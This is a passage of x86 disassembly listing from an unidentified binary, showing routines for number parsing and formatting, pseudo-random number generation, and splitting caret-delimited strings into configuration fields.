  40563c:	75 f2                	jne    0x405630
  40563e:	66 83 3e 2d          	cmpw   $0x2d,(%esi)
  405642:	75 05                	jne    0x405649
  405644:	83 cb ff             	or     $0xffffffff,%ebx
  405647:	46                   	inc    %esi
  405648:	46                   	inc    %esi
  405649:	66 83 3e 2b          	cmpw   $0x2b,(%esi)
  40564d:	75 1a                	jne    0x405669
  40564f:	eb 16                	jmp    0x405667
  405651:	66 3d 30 00          	cmp    $0x30,%ax
  405655:	72 23                	jb     0x40567a
  405657:	66 3d 39 00          	cmp    $0x39,%ax
  40565b:	77 1d                	ja     0x40567a
  40565d:	6b ff 0a             	imul   $0xa,%edi,%edi
  405660:	0f b7 c0             	movzwl %ax,%eax
  405663:	8d 7c 07 d0          	lea    -0x30(%edi,%eax,1),%edi
  405667:	46                   	inc    %esi
  405668:	46                   	inc    %esi
  405669:	0f b7 06             	movzwl (%esi),%eax
  40566c:	66 85 c0             	test   %ax,%ax
  40566f:	75 e0                	jne    0x405651
  405671:	8b c7                	mov    %edi,%eax
  405673:	0f af c3             	imul   %ebx,%eax
  405676:	5f                   	pop    %edi
  405677:	5e                   	pop    %esi
  405678:	5b                   	pop    %ebx
  405679:	c3                   	ret
  40567a:	33 c0                	xor    %eax,%eax
  40567c:	eb f8                	jmp    0x405676
  40567e:	55                   	push   %ebp
  40567f:	8b ec                	mov    %esp,%ebp
  405681:	51                   	push   %ecx
  405682:	51                   	push   %ecx
  405683:	53                   	push   %ebx
  405684:	56                   	push   %esi
  405685:	57                   	push   %edi
  405686:	33 ff                	xor    %edi,%edi
  405688:	8b f0                	mov    %eax,%esi
  40568a:	33 db                	xor    %ebx,%ebx
  40568c:	eb 02                	jmp    0x405690
  40568e:	46                   	inc    %esi
  40568f:	46                   	inc    %esi
  405690:	66 8b 06             	mov    (%esi),%ax
  405693:	e8 23 ff ff ff       	call   0x4055bb
  405698:	85 c0                	test   %eax,%eax
  40569a:	75 f2                	jne    0x40568e
  40569c:	66 83 3e 2d          	cmpw   $0x2d,(%esi)
  4056a0:	75 02                	jne    0x4056a4
  4056a2:	46                   	inc    %esi
  4056a3:	46                   	inc    %esi
  4056a4:	66 83 3e 2b          	cmpw   $0x2b,(%esi)
  4056a8:	75 38                	jne    0x4056e2
  4056aa:	eb 34                	jmp    0x4056e0
  4056ac:	66 3d 30 00          	cmp    $0x30,%ax
  4056b0:	72 41                	jb     0x4056f3
  4056b2:	66 3d 39 00          	cmp    $0x39,%ax
  4056b6:	77 3b                	ja     0x4056f3
  4056b8:	0f b7 c0             	movzwl %ax,%eax
  4056bb:	6a 00                	push   $0x0
  4056bd:	83 e8 30             	sub    $0x30,%eax
  4056c0:	99                   	cltd
  4056c1:	6a 0a                	push   $0xa
  4056c3:	53                   	push   %ebx
  4056c4:	8b ca                	mov    %edx,%ecx
  4056c6:	57                   	push   %edi
  4056c7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4056ca:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4056cd:	e8 1e 7e 00 00       	call   0x40d4f0
  4056d2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4056d5:	03 c8                	add    %eax,%ecx
  4056d7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4056da:	13 c2                	adc    %edx,%eax
  4056dc:	8b f9                	mov    %ecx,%edi
  4056de:	8b d8                	mov    %eax,%ebx
  4056e0:	46                   	inc    %esi
  4056e1:	46                   	inc    %esi
  4056e2:	0f b7 06             	movzwl (%esi),%eax
  4056e5:	66 85 c0             	test   %ax,%ax
  4056e8:	75 c2                	jne    0x4056ac
  4056ea:	8b c7                	mov    %edi,%eax
  4056ec:	8b d3                	mov    %ebx,%edx
  4056ee:	5f                   	pop    %edi
  4056ef:	5e                   	pop    %esi
  4056f0:	5b                   	pop    %ebx
  4056f1:	c9                   	leave
  4056f2:	c3                   	ret
  4056f3:	33 c0                	xor    %eax,%eax
  4056f5:	33 d2                	xor    %edx,%edx
  4056f7:	eb f5                	jmp    0x4056ee
  4056f9:	53                   	push   %ebx
  4056fa:	56                   	push   %esi
  4056fb:	8b f0                	mov    %eax,%esi
  4056fd:	57                   	push   %edi
  4056fe:	8b f9                	mov    %ecx,%edi
  405700:	b8 00 ca 9a 3b       	mov    $0x3b9aca00,%eax
  405705:	3b f8                	cmp    %eax,%edi
  405707:	8b de                	mov    %esi,%ebx
  405709:	8b c8                	mov    %eax,%ecx
  40570b:	73 11                	jae    0x40571e
  40570d:	8b c1                	mov    %ecx,%eax
  40570f:	6a 0a                	push   $0xa
  405711:	33 d2                	xor    %edx,%edx
  405713:	59                   	pop    %ecx
  405714:	f7 f1                	div    %ecx
  405716:	8b c8                	mov    %eax,%ecx
  405718:	3b f9                	cmp    %ecx,%edi
  40571a:	72 f1                	jb     0x40570d
  40571c:	eb 1e                	jmp    0x40573c
  40571e:	33 d2                	xor    %edx,%edx
  405720:	8b c7                	mov    %edi,%eax
  405722:	f7 f1                	div    %ecx
  405724:	6a 0a                	push   $0xa
  405726:	8d 50 30             	lea    0x30(%eax),%edx
  405729:	0f af c1             	imul   %ecx,%eax
  40572c:	2b f8                	sub    %eax,%edi
  40572e:	66 89 16             	mov    %dx,(%esi)
  405731:	8b c1                	mov    %ecx,%eax
  405733:	33 d2                	xor    %edx,%edx
  405735:	59                   	pop    %ecx
  405736:	f7 f1                	div    %ecx
  405738:	46                   	inc    %esi
  405739:	46                   	inc    %esi
  40573a:	8b c8                	mov    %eax,%ecx
  40573c:	85 c9                	test   %ecx,%ecx
  40573e:	75 de                	jne    0x40571e
  405740:	66 21 0e             	and    %cx,(%esi)
  405743:	5f                   	pop    %edi
  405744:	5e                   	pop    %esi
  405745:	8b c3                	mov    %ebx,%eax
  405747:	5b                   	pop    %ebx
  405748:	c3                   	ret
  405749:	53                   	push   %ebx
  40574a:	56                   	push   %esi
  40574b:	57                   	push   %edi
  40574c:	8b 3d cc a4 41 00    	mov    0x41a4cc,%edi
  405752:	85 ff                	test   %edi,%edi
  405754:	8b f0                	mov    %eax,%esi
  405756:	8b de                	mov    %esi,%ebx
  405758:	75 0b                	jne    0x405765
  40575a:	66 c7 06 30 00       	movw   $0x30,(%esi)
  40575f:	66 21 7e 02          	and    %di,0x2(%esi)
  405763:	eb 4c                	jmp    0x4057b1
  405765:	7d 09                	jge    0x405770
  405767:	f7 df                	neg    %edi
  405769:	66 c7 06 2d 00       	movw   $0x2d,(%esi)
  40576e:	46                   	inc    %esi
  40576f:	46                   	inc    %esi
  405770:	b9 00 ca 9a 3b       	mov    $0x3b9aca00,%ecx
  405775:	3b f9                	cmp    %ecx,%edi
  405777:	73 11                	jae    0x40578a
  405779:	8b c1                	mov    %ecx,%eax
  40577b:	6a 0a                	push   $0xa
  40577d:	33 d2                	xor    %edx,%edx
  40577f:	59                   	pop    %ecx
  405780:	f7 f1                	div    %ecx
  405782:	8b c8                	mov    %eax,%ecx
  405784:	3b f9                	cmp    %ecx,%edi
  405786:	72 f1                	jb     0x405779
  405788:	eb 1e                	jmp    0x4057a8
  40578a:	33 d2                	xor    %edx,%edx
  40578c:	8b c7                	mov    %edi,%eax
  40578e:	f7 f1                	div    %ecx
  405790:	6a 0a                	push   $0xa
  405792:	8d 50 30             	lea    0x30(%eax),%edx
  405795:	0f af c1             	imul   %ecx,%eax
  405798:	2b f8                	sub    %eax,%edi
  40579a:	66 89 16             	mov    %dx,(%esi)
  40579d:	8b c1                	mov    %ecx,%eax
  40579f:	33 d2                	xor    %edx,%edx
  4057a1:	59                   	pop    %ecx
  4057a2:	f7 f1                	div    %ecx
  4057a4:	46                   	inc    %esi
  4057a5:	46                   	inc    %esi
  4057a6:	8b c8                	mov    %eax,%ecx
  4057a8:	85 c9                	test   %ecx,%ecx
  4057aa:	75 de                	jne    0x40578a
  4057ac:	66 21 0e             	and    %cx,(%esi)
  4057af:	8b c3                	mov    %ebx,%eax
  4057b1:	5f                   	pop    %edi
  4057b2:	5e                   	pop    %esi
  4057b3:	5b                   	pop    %ebx
  4057b4:	c3                   	ret
  4057b5:	55                   	push   %ebp
  4057b6:	8b ec                	mov    %esp,%ebp
  4057b8:	51                   	push   %ecx
  4057b9:	53                   	push   %ebx
  4057ba:	8b d8                	mov    %eax,%ebx
  4057bc:	8b 45 08             	mov    0x8(%ebp),%eax
  4057bf:	0b 45 0c             	or     0xc(%ebp),%eax
  4057c2:	56                   	push   %esi
  4057c3:	57                   	push   %edi
  4057c4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4057c7:	75 0d                	jne    0x4057d6
  4057c9:	66 c7 03 30 00       	movw   $0x30,(%ebx)
  4057ce:	66 21 43 02          	and    %ax,0x2(%ebx)
  4057d2:	8b c3                	mov    %ebx,%eax
  4057d4:	eb 72                	jmp    0x405848
  4057d6:	be 04 23 c7 8a       	mov    $0x8ac72304,%esi
  4057db:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4057de:	bf 00 00 e8 89       	mov    $0x89e80000,%edi
  4057e3:	77 24                	ja     0x405809
  4057e5:	72 05                	jb     0x4057ec
  4057e7:	39 7d 08             	cmp    %edi,0x8(%ebp)
  4057ea:	73 1d                	jae    0x405809
  4057ec:	6a 00                	push   $0x0
  4057ee:	6a 0a                	push   $0xa
  4057f0:	56                   	push   %esi
  4057f1:	57                   	push   %edi
  4057f2:	e8 89 7c 00 00       	call   0x40d480
  4057f7:	8b f2                	mov    %edx,%esi
  4057f9:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4057fc:	8b f8                	mov    %eax,%edi
  4057fe:	72 ec                	jb     0x4057ec
  405800:	77 3a                	ja     0x40583c
  405802:	39 7d 08             	cmp    %edi,0x8(%ebp)
  405805:	72 e5                	jb     0x4057ec
  405807:	eb 33                	jmp    0x40583c
  405809:	56                   	push   %esi
  40580a:	57                   	push   %edi
  40580b:	ff 75 0c             	push   0xc(%ebp)
  40580e:	ff 75 08             	push   0x8(%ebp)
  405811:	e8 6a 7c 00 00       	call   0x40d480
  405816:	56                   	push   %esi
  405817:	57                   	push   %edi
  405818:	52                   	push   %edx
  405819:	8d 48 30             	lea    0x30(%eax),%ecx
  40581c:	50                   	push   %eax
  40581d:	66 89 0b             	mov    %cx,(%ebx)
  405820:	e8 cb 7c 00 00       	call   0x40d4f0
  405825:	29 45 08             	sub    %eax,0x8(%ebp)
  405828:	6a 00                	push   $0x0
  40582a:	6a 0a                	push   $0xa
  40582c:	19 55 0c             	sbb    %edx,0xc(%ebp)
  40582f:	56                   	push   %esi
  405830:	57                   	push   %edi
  405831:	e8 4a 7c 00 00       	call   0x40d480
  405836:	43                   	inc    %ebx
  405837:	8b f8                	mov    %eax,%edi
  405839:	8b f2                	mov    %edx,%esi
  40583b:	43                   	inc    %ebx
  40583c:	8b c7                	mov    %edi,%eax
  40583e:	0b c6                	or     %esi,%eax
  405840:	75 c7                	jne    0x405809
  405842:	66 21 03             	and    %ax,(%ebx)
  405845:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405848:	5f                   	pop    %edi
  405849:	5e                   	pop    %esi
  40584a:	5b                   	pop    %ebx
  40584b:	c9                   	leave
  40584c:	c3                   	ret
  40584d:	a1 e0 14 41 00       	mov    0x4114e0,%eax
  405852:	69 c0 fd 43 03 00    	imul   $0x343fd,%eax,%eax
  405858:	05 c3 9e 26 00       	add    $0x269ec3,%eax
  40585d:	a3 e0 14 41 00       	mov    %eax,0x4114e0
  405862:	c1 e8 10             	shr    $0x10,%eax
  405865:	25 ff 7f 00 00       	and    $0x7fff,%eax
  40586a:	c3                   	ret
  40586b:	56                   	push   %esi
  40586c:	8b f0                	mov    %eax,%esi
  40586e:	eb 02                	jmp    0x405872
  405870:	46                   	inc    %esi
  405871:	46                   	inc    %esi
  405872:	66 8b 06             	mov    (%esi),%ax
  405875:	e8 41 fd ff ff       	call   0x4055bb
  40587a:	85 c0                	test   %eax,%eax
  40587c:	75 f2                	jne    0x405870
  40587e:	66 39 3e             	cmp    %di,(%esi)
  405881:	75 08                	jne    0x40588b
  405883:	8d 46 02             	lea    0x2(%esi),%eax
  405886:	66 39 38             	cmp    %di,(%eax)
  405889:	75 09                	jne    0x405894
  40588b:	66 85 ff             	test   %di,%di
  40588e:	74 0b                	je     0x40589b
  405890:	33 c0                	xor    %eax,%eax
  405892:	5e                   	pop    %esi
  405893:	c3                   	ret
  405894:	66 85 ff             	test   %di,%di
  405897:	74 02                	je     0x40589b
  405899:	8b f0                	mov    %eax,%esi
  40589b:	53                   	push   %ebx
  40589c:	83 ca ff             	or     $0xffffffff,%edx
  40589f:	8b c6                	mov    %esi,%eax
  4058a1:	b3 01                	mov    $0x1,%bl
  4058a3:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4058a7:	74 46                	je     0x4058ef
  4058a9:	eb 0f                	jmp    0x4058ba
  4058ab:	0f b7 0e             	movzwl (%esi),%ecx
  4058ae:	66 3b cf             	cmp    %di,%cx
  4058b1:	74 11                	je     0x4058c4
  4058b3:	66 85 c9             	test   %cx,%cx
  4058b6:	74 0c                	je     0x4058c4
  4058b8:	46                   	inc    %esi
  4058b9:	46                   	inc    %esi
  4058ba:	66 8b 4c 24 10       	mov    0x10(%esp),%cx
  4058bf:	66 39 0e             	cmp    %cx,(%esi)
  4058c2:	75 e7                	jne    0x4058ab
  4058c4:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4058c8:	42                   	inc    %edx
  4058c9:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  4058cc:	0f b7 06             	movzwl (%esi),%eax
  4058cf:	66 3b c7             	cmp    %di,%ax
  4058d2:	74 05                	je     0x4058d9
  4058d4:	66 85 c0             	test   %ax,%ax
  4058d7:	75 02                	jne    0x4058db
  4058d9:	32 db                	xor    %bl,%bl
  4058db:	66 83 26 00          	andw   $0x0,(%esi)
  4058df:	46                   	inc    %esi
  4058e0:	46                   	inc    %esi
  4058e1:	84 db                	test   %bl,%bl
  4058e3:	8b c6                	mov    %esi,%eax
  4058e5:	75 bc                	jne    0x4058a3
  4058e7:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4058eb:	74 02                	je     0x4058ef
  4058ed:	46                   	inc    %esi
  4058ee:	46                   	inc    %esi
  4058ef:	8b 44 24 14          	mov    0x14(%esp),%eax
  4058f3:	42                   	inc    %edx
  4058f4:	89 10                	mov    %edx,(%eax)
  4058f6:	5b                   	pop    %ebx
  4058f7:	8b c6                	mov    %esi,%eax
  4058f9:	5e                   	pop    %esi
  4058fa:	c3                   	ret
  4058fb:	55                   	push   %ebp
  4058fc:	8b ec                	mov    %esp,%ebp
  4058fe:	81 ec b8 04 00 00    	sub    $0x4b8,%esp
  405904:	53                   	push   %ebx
  405905:	56                   	push   %esi
  405906:	57                   	push   %edi
  405907:	33 f6                	xor    %esi,%esi
  405909:	68 ac 04 00 00       	push   $0x4ac
  40590e:	8d 85 4c fb ff ff    	lea    -0x4b4(%ebp),%eax
  405914:	56                   	push   %esi
  405915:	50                   	push   %eax
  405916:	89 b5 48 fb ff ff    	mov    %esi,-0x4b8(%ebp)
  40591c:	e8 0f 7c 00 00       	call   0x40d530
  405921:	8b 7d 14             	mov    0x14(%ebp),%edi
  405924:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405927:	50                   	push   %eax
  405928:	ff 75 10             	push   0x10(%ebp)
  40592b:	8d 85 48 fb ff ff    	lea    -0x4b8(%ebp),%eax
  405931:	50                   	push   %eax
  405932:	8b 45 08             	mov    0x8(%ebp),%eax
  405935:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405938:	e8 2e ff ff ff       	call   0x40586b
  40593d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  405940:	83 c4 18             	add    $0x18,%esp
  405943:	3b de                	cmp    %esi,%ebx
  405945:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405948:	7e 20                	jle    0x40596a
  40594a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40594d:	8d b5 48 fb ff ff    	lea    -0x4b8(%ebp),%esi
  405953:	2b f7                	sub    %edi,%esi
  405955:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405958:	8b 04 3e             	mov    (%esi,%edi,1),%eax
  40595b:	e8 74 fc ff ff       	call   0x4055d4
  405960:	89 07                	mov    %eax,(%edi)
  405962:	83 c7 04             	add    $0x4,%edi
  405965:	ff 4d fc             	decl   -0x4(%ebp)
  405968:	75 ee                	jne    0x405958
  40596a:	8b 45 18             	mov    0x18(%ebp),%eax
  40596d:	5f                   	pop    %edi
  40596e:	89 18                	mov    %ebx,(%eax)
  405970:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405973:	5e                   	pop    %esi
  405974:	5b                   	pop    %ebx
  405975:	c9                   	leave
  405976:	c3                   	ret
  405977:	55                   	push   %ebp
  405978:	8b ec                	mov    %esp,%ebp
  40597a:	83 ec 2c             	sub    $0x2c,%esp
  40597d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405981:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405984:	50                   	push   %eax
  405985:	6a 27                	push   $0x27
  405987:	6a 5e                	push   $0x5e
  405989:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40598c:	50                   	push   %eax
  40598d:	8b 45 08             	mov    0x8(%ebp),%eax
  405990:	83 c0 12             	add    $0x12,%eax
  405993:	50                   	push   %eax
  405994:	e8 62 ff ff ff       	call   0x4058fb
  405999:	83 c4 14             	add    $0x14,%esp
  40599c:	85 c0                	test   %eax,%eax
  40599e:	74 15                	je     0x4059b5
  4059a0:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  4059a4:	75 0f                	jne    0x4059b5
  4059a6:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4059a9:	a3 f8 3b 42 00       	mov    %eax,0x423bf8
  4059ae:	b8 00 00 20 00       	mov    $0x200000,%eax
  4059b3:	c9                   	leave
  4059b4:	c3                   	ret
  4059b5:	33 c0                	xor    %eax,%eax
  4059b7:	c9                   	leave
  4059b8:	c3                   	ret
  4059b9:	55                   	push   %ebp
  4059ba:	8b ec                	mov    %esp,%ebp
  4059bc:	83 ec 34             	sub    $0x34,%esp
  4059bf:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4059c3:	53                   	push   %ebx
  4059c4:	56                   	push   %esi
  4059c5:	57                   	push   %edi
  4059c6:	8b f0                	mov    %eax,%esi
  4059c8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4059cb:	50                   	push   %eax
  4059cc:	6a 22                	push   $0x22
  4059ce:	6a 5e                	push   $0x5e
  4059d0:	5b                   	pop    %ebx
  4059d1:	53                   	push   %ebx
  4059d2:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4059d5:	50                   	push   %eax
  4059d6:	83 c6 12             	add    $0x12,%esi
  4059d9:	56                   	push   %esi
  4059da:	c7 45 f4 03 00 00 00 	movl   $0x3,-0xc(%ebp)
  4059e1:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4059e8:	e8 0e ff ff ff       	call   0x4058fb
  4059ed:	83 c4 14             	add    $0x14,%esp
  4059f0:	85 c0                	test   %eax,%eax
  4059f2:	74 25                	je     0x405a19
  4059f4:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  4059f8:	75 1f                	jne    0x405a19
  4059fa:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4059fd:	85 c0                	test   %eax,%eax
  4059ff:	74 18                	je     0x405a19
  405a01:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405a04:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405a07:	83 f8 09             	cmp    $0x9,%eax
  405a0a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405a0d:	76 0a                	jbe    0x405a19
  405a0f:	6a 0a                	push   $0xa
  405a11:	33 d2                	xor    %edx,%edx
  405a13:	59                   	pop    %ecx
  405a14:	f7 f1                	div    %ecx
  405a16:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405a19:	83 25 28 04 42 00 00 	andl   $0x0,0x420428
  405a20:	68 28 04 42 00       	push   $0x420428
  405a25:	53                   	push   %ebx
  405a26:	68 78 76 41 00       	push   $0x417678
  405a2b:	6a 27                	push   $0x27
  405a2d:	5f                   	pop    %edi
  405a2e:	8b c6                	mov    %esi,%eax
  405a30:	e8 36 fe ff ff       	call   0x40586b
  405a35:	83 c4 0c             	add    $0xc,%esp
  405a38:	85 c0                	test   %eax,%eax
  405a3a:	0f 84 d4 00 00 00    	je     0x405b14
  405a40:	68 2c 04 42 00       	push   $0x42042c
  405a45:	53                   	push   %ebx
  405a46:	68 68 28 42 00       	push   $0x422868
  405a4b:	e8 1b fe ff ff       	call   0x40586b
  405a50:	83 c4 0c             	add    $0xc,%esp
  405a53:	85 c0                	test   %eax,%eax
  405a55:	0f 84 b9 00 00 00    	je     0x405b14
  405a5b:	68 ec 2e 42 00       	push   $0x422eec
  405a60:	53                   	push   %ebx
  405a61:	68 80 52 41 00       	push   $0x415280
  405a66:	e8 00 fe ff ff       	call   0x40586b
  405a6b:	83 c4 0c             	add    $0xc,%esp
  405a6e:	85 c0                	test   %eax,%eax
  405a70:	0f 84 9e 00 00 00    	je     0x405b14
  405a76:	68 20 3d 42 00       	push   $0x423d20
  405a7b:	57                   	push   %edi
  405a7c:	53                   	push   %ebx
  405a7d:	68 f0 2e 42 00       	push   $0x422ef0
  405a82:	50                   	push   %eax
  405a83:	e8 73 fe ff ff       	call   0x4058fb
  405a88:	83 c4 14             	add    $0x14,%esp
  405a8b:	85 c0                	test   %eax,%eax
  405a8d:	0f 84 81 00 00 00    	je     0x405b14
  405a93:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405a96:	51                   	push   %ecx
  405a97:	57                   	push   %edi
  405a98:	53                   	push   %ebx
  405a99:	68 98 9f 41 00       	push   $0x419f98
  405a9e:	50                   	push   %eax
  405a9f:	e8 57 fe ff ff       	call   0x4058fb
  405aa4:	83 c4 14             	add    $0x14,%esp
  405aa7:	85 c0                	test   %eax,%eax
  405aa9:	74 69                	je     0x405b14
  405aab:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405aae:	51                   	push   %ecx
  405aaf:	53                   	push   %ebx
  405ab0:	68 ac f5 41 00       	push   $0x41f5ac
  405ab5:	e8 b1 fd ff ff       	call   0x40586b
  405aba:	83 c4 0c             	add    $0xc,%esp
  405abd:	85 c0                	test   %eax,%eax
  405abf:	74 53                	je     0x405b14
  405ac1:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  405ac5:	7c 4d                	jl     0x405b14
  405ac7:	68 54 f5 41 00       	push   $0x41f554
  405acc:	57                   	push   %edi
  405acd:	53                   	push   %ebx
  405ace:	68 d4 3d 42 00       	push   $0x423dd4
  405ad3:	50                   	push   %eax
  405ad4:	e8 22 fe ff ff       	call   0x4058fb
  405ad9:	83 c4 14             	add    $0x14,%esp
  405adc:	85 c0                	test   %eax,%eax
  405ade:	74 34                	je     0x405b14
  405ae0:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405ae3:	51                   	push   %ecx
  405ae4:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405ae7:	53                   	push   %ebx
  405ae8:	51                   	push   %ecx
  405ae9:	e8 7d fd ff ff       	call   0x40586b
  405aee:	8b 75 f8             	mov    -0x8(%ebp),%esi
  405af1:	f7 d8                	neg    %eax
  405af3:	68 b7 2d 40 00       	push   $0x402db7
  405af8:	ff 75 f4             	push   -0xc(%ebp)
  405afb:	1b c0                	sbb    %eax,%eax
  405afd:	23 45 cc             	and    -0x34(%ebp),%eax
  405b00:	6a 10                	push   $0x10
  405b02:	a3 74 76 41 00       	mov    %eax,0x417674
  405b07:	e8 76 0e 00 00       	call   0x406982
  405b0c:	83 c4 18             	add    $0x18,%esp
  405b0f:	6a 10                	push   $0x10
  405b11:	58                   	pop    %eax
  405b12:	eb 02                	jmp    0x405b16
  405b14:	33 c0                	xor    %eax,%eax
  405b16:	5f                   	pop    %edi
  405b17:	5e                   	pop    %esi
  405b18:	5b                   	pop    %ebx
  405b19:	c9                   	leave
  405b1a:	c3                   	ret
  405b1b:	55                   	push   %ebp
  405b1c:	8b ec                	mov    %esp,%ebp
  405b1e:	83 ec 34             	sub    $0x34,%esp
  405b21:	53                   	push   %ebx
  405b22:	56                   	push   %esi
  405b23:	57                   	push   %edi
  405b24:	8b f0                	mov    %eax,%esi
  405b26:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405b29:	50                   	push   %eax
  405b2a:	6a 22                	push   $0x22
  405b2c:	6a 5e                	push   $0x5e
  405b2e:	5b                   	pop    %ebx
  405b2f:	53                   	push   %ebx
  405b30:	8d 45 cc             	lea    -0x34(%ebp),%eax
  405b33:	50                   	push   %eax
  405b34:	33 ff                	xor    %edi,%edi
  405b36:	83 c6 10             	add    $0x10,%esi
  405b39:	56                   	push   %esi
  405b3a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405b3d:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  405b44:	89 7d f8             	mov    %edi,-0x8(%ebp)
  405b47:	e8 af fd ff ff       	call   0x4058fb
  405b4c:	83 c4 14             	add    $0x14,%esp
  405b4f:	85 c0                	test   %eax,%eax
  405b51:	74 25                	je     0x405b78
  405b53:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  405b57:	75 1f                	jne    0x405b78
  405b59:	8b 45 cc             	mov    -0x34(%ebp),%eax
  405b5c:	3b c7                	cmp    %edi,%eax
  405b5e:	74 18                	je     0x405b78
  405b60:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405b63:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405b66:	83 f8 09             	cmp    $0x9,%eax
  405b69:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405b6c:	76 0a                	jbe    0x405b78
  405b6e:	6a 0a                	push   $0xa
  405b70:	33 d2                	xor    %edx,%edx
  405b72:	59                   	pop    %ecx
  405b73:	f7 f1                	div    %ecx
  405b75:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405b78:	68 20 9f 41 00       	push   $0x419f20
  405b7d:	53                   	push   %ebx
  405b7e:	68 c8 2b 42 00       	push   $0x422bc8
  405b83:	89 3d 20 9f 41 00    	mov    %edi,0x419f20
  405b89:	6a 27                	push   $0x27
  405b8b:	5f                   	pop    %edi
  405b8c:	8b c6                	mov    %esi,%eax
  405b8e:	e8 d8 fc ff ff       	call   0x40586b
  405b93:	83 c4 0c             	add    $0xc,%esp
  405b96:	85 c0                	test   %eax,%eax
  405b98:	0f 84 d9 00 00 00    	je     0x405c77
  405b9e:	68 14 3a 42 00       	push   $0x423a14
  405ba3:	53                   	push   %ebx
  405ba4:	68 58 2d 42 00       	push   $0x422d58
  405ba9:	e8 bd fc ff ff       	call   0x40586b
  405bae:	83 c4 0c             	add    $0xc,%esp
  405bb1:	85 c0                	test   %eax,%eax
  405bb3:	0f 84 be 00 00 00    	je     0x405c77
  405bb9:	68 fc 3b 42 00       	push   $0x423bfc
  405bbe:	53                   	push   %ebx
  405bbf:	68 c0 d0 41 00       	push   $0x41d0c0
  405bc4:	e8 a2 fc ff ff       	call   0x40586b
  405bc9:	83 c4 0c             	add    $0xc,%esp
  405bcc:	85 c0                	test   %eax,%eax
  405bce:	0f 84 a3 00 00 00    	je     0x405c77
  405bd4:	68 24 3d 42 00       	push   $0x423d24
  405bd9:	57                   	push   %edi
  405bda:	53                   	push   %ebx
  405bdb:	68 58 35 42 00       	push   $0x423558
  405be0:	50                   	push   %eax
  405be1:	e8 15 fd ff ff       	call   0x4058fb
  405be6:	83 c4 14             	add    $0x14,%esp
  405be9:	85 c0                	test   %eax,%eax
  405beb:	0f 84 86 00 00 00    	je     0x405c77
  405bf1:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405bf4:	51                   	push   %ecx
  405bf5:	57                   	push   %edi
  405bf6:	53                   	push   %ebx
  405bf7:	68 58 4b 41 00       	push   $0x414b58
  405bfc:	50                   	push   %eax
  405bfd:	e8 f9 fc ff ff       	call   0x4058fb
  405c02:	83 c4 14             	add    $0x14,%esp
  405c05:	85 c0                	test   %eax,%eax
  405c07:	74 6e                	je     0x405c77
  405c09:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405c0c:	51                   	push   %ecx
  405c0d:	57                   	push   %edi
  405c0e:	53                   	push   %ebx
  405c0f:	68 a4 a4 41 00       	push   $0x41a4a4
  405c14:	50                   	push   %eax
  405c15:	e8 e1 fc ff ff       	call   0x4058fb
  405c1a:	83 c4 14             	add    $0x14,%esp
  405c1d:	85 c0                	test   %eax,%eax
  405c1f:	74 56                	je     0x405c77
  405c21:	83 7d fc 04          	cmpl   $0x4,-0x4(%ebp)
  405c25:	7c 50                	jl     0x405c77
  405c27:	68 1c fc 41 00       	push   $0x41fc1c
  405c2c:	57                   	push   %edi
  405c2d:	53                   	push   %ebx
  405c2e:	68 9c 2b 42 00       	push   $0x422b9c
  405c33:	50                   	push   %eax
  405c34:	e8 c2 fc ff ff       	call   0x4058fb
  405c39:	83 c4 14             	add    $0x14,%esp
  405c3c:	85 c0                	test   %eax,%eax
  405c3e:	74 37                	je     0x405c77
  405c40:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405c43:	51                   	push   %ecx
  405c44:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405c47:	53                   	push   %ebx
  405c48:	51                   	push   %ecx
  405c49:	e8 1d fc ff ff       	call   0x40586b
  405c4e:	8b 75 f8             	mov    -0x8(%ebp),%esi
  405c51:	f7 d8                	neg    %eax
  405c53:	68 f3 2d 40 00       	push   $0x402df3
  405c58:	ff 75 f4             	push   -0xc(%ebp)
  405c5b:	1b c0                	sbb    %eax,%eax
